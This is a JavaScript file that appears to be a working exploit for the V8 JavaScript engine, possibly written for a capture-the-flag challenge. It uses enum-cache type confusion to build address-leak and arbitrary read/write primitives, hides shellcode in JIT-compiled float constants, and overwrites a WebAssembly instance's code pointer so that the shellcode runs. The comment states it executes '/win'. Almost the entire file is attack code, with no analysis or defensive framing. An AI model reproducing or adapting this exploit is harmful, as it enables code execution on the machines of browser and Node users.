/* eslint-disable guard-for-in */
/* eslint-disable require-jsdoc */
class Helpers {
  constructor() {
    this.buf = new ArrayBuffer(8);
    this.dv = new DataView(this.buf);
    this.u8 = new Uint8Array(this.buf);
    this.u32 = new Uint32Array(this.buf);
    this.u64 = new BigUint64Array(this.buf);
    this.f32 = new Float32Array(this.buf);
    this.f64 = new Float64Array(this.buf);

    this.roots = new Array(0x30000);
    this.index = 0;
  }

  pair_i32_to_f64(p1, p2) {
    this.u32[0] = p1;
    this.u32[1] = p2;
    return this.f64[0];
  }

  i64tof64(i) {
    this.u64[0] = i;
    return this.f64[0];
  }

  f64toi64(f) {
    this.f64[0] = f;
    return this.u64[0];
  }

  set_i64(i) {
    this.u64[0] = i;
  }

  set_l(i) {
    this.u32[0] = i;
  }

  set_h(i) {
    this.u32[1] = i;
  }

  get_i64() {
    return this.u64[0];
  }

  get_f64() {
    return this.f64[0];
  }

  ftoil(f) {
    this.f64[0] = f;
    return this.u32[0];
  }

  ftoih(f) {
    this.f64[0] = f;
    return this.u32[1];
  }

  add_ref(object) {
    this.roots[this.index++] = object;
  }

  mark_sweep_gc() {
    new ArrayBuffer(0x7fe00000);
  }

  scavenge_gc() {
    for (let i = 0; i < 8; i++) {
      // fill up new space external backing store bytes
      this.add_ref(new ArrayBuffer(0x200000));
    }
    this.add_ref(new ArrayBuffer(8));
  }

  hex(i) {
    return i.toString(16).padStart(16, "0");
  }

  breakpoint() {
    this.buf.slice();
  }
}
function sleep(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
function hang() {
  while (1) {}
}

function pwn() {
  const helper = new Helpers();

  // =================== //
  //     Start here!     //
  // =================== //
  helper.scavenge_gc();

  helper.mark_sweep_gc();
  helper.mark_sweep_gc();
  // 00042129

  driver_array = [
    3.69439535138165225921828113275e-311, 1.11253692977586019346629363689e-308,
    3.3, 4.4,
  ];
  const float_array = [1.1, 2.2, 3.3, 4.4];
  const obj_array = [{}, {}, {}, {}];

  const object1 = {};
  object1.a = 1;
  const object2 = {};
  object2.a = 1;
  object2.b = 1;
  const object3 = {};
  object3.a = 1;
  object3.b = 1;
  object3.c = 1;
  for (const key in object2) {
  }

  // %DebugPrint(driver_array);
  // %SystemBreak();
  fake_object_array = [
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
    2.2431044572652967563980781402e-308, 2.2431044572652967563980781402e-308,
  ];

  let esc;
  function trigger(callback) {
    for (const key in object2) {
      callback();
      esc = object2[key];
    }
  }

  for (let i = 0; i < 0x10000; i++) {
    trigger((_) => _);
    trigger((_) => _);
    trigger((_) => _);
    trigger((_) => _);
  }
  sleep(2000);
  trigger((_) => {
    object3.c = 1.1;
    for (const key in object1) {
    }
  });

  //exec "/win" for test
  const shellcode = () => {
    return [
      1.97118289794847608001401956399e-246,
      1.95606125617386423530332076722e-246,
      1.99957147195425773436923756715e-246,
      1.95337673326740932133292175341e-246,
      2.63486047652296056448306022844e-284,
    ];
  };

  for (var i = 0; i < 0x10000; i++) {
    shellcode();
    shellcode();
    shellcode();
    shellcode();
  }
  sleep(2000);
  // fake_object_array;
  // %DebugPrint(driver_array);
  // %DebugPrint(float_array);
  // %DebugPrint(obj_array);
  // %DebugPrint(esc);

  function addrof(obj) {
    obj_array[0] = obj;
    return helper.ftoil(esc[14]);
  }
  // let a = {};
  // %DebugPrint(a);
  // // console.log(helper.hex(addrof(a)));
  function aar(addr) {
    const fake_length_elements = helper.pair_i32_to_f64(addr - 8, 8);
    esc[12] = fake_length_elements;
    return float_array[0];
  }
  let cagebase = helper.ftoil(aar(0x300078 + 1));
  // %DebugPrint(helper.hex(cagebase));
  function aaw(addr, value) {
    const fake_length_elements = helper.pair_i32_to_f64(addr - 8, 8);
    esc[12] = fake_length_elements;
    float_array[0] = value;
  }

  var wasmCode = new Uint8Array([
    0, 97, 115, 109, 1, 0, 0, 0, 1, 133, 128, 128, 128, 0, 1, 96, 0, 1, 127, 3,
    130, 128, 128, 128, 0, 1, 0, 4, 132, 128, 128, 128, 0, 1, 112, 0, 0, 5, 131,
    128, 128, 128, 0, 1, 0, 1, 6, 129, 128, 128, 128, 0, 0, 7, 145, 128, 128,
    128, 0, 2, 6, 109, 101, 109, 111, 114, 121, 2, 0, 4, 109, 97, 105, 110, 0,
    0, 10, 138, 128, 128, 128, 0, 1, 132, 128, 128, 128, 0, 0, 65, 42, 11,
  ]);
  var wasmModule = new WebAssembly.Module(wasmCode);
  var wasmInstance = new WebAssembly.Instance(wasmModule, {});
  var f = wasmInstance.exports.main;

  let wasm_instance_addr = addrof(wasmInstance);
  // %DebugPrint(shellcode);
  let code_addr = aar(addrof(shellcode) + 8);
  let ins_addr = aar(helper.ftoih(code_addr) + 0x10);
  let real_addr = helper.pair_i32_to_f64(
    helper.ftoih(ins_addr) + 0x7d,
    cagebase
  );
  // %DebugPrint(helper.hex(helper.f64toi64(real_addr)));
  // %DebugPrint(helper.hex(wasm_instance_addr));
  // %DebugPrint(wasmInstance);
  aaw(wasm_instance_addr + 0x48, real_addr);
  f();
  hang();
}

pwn();
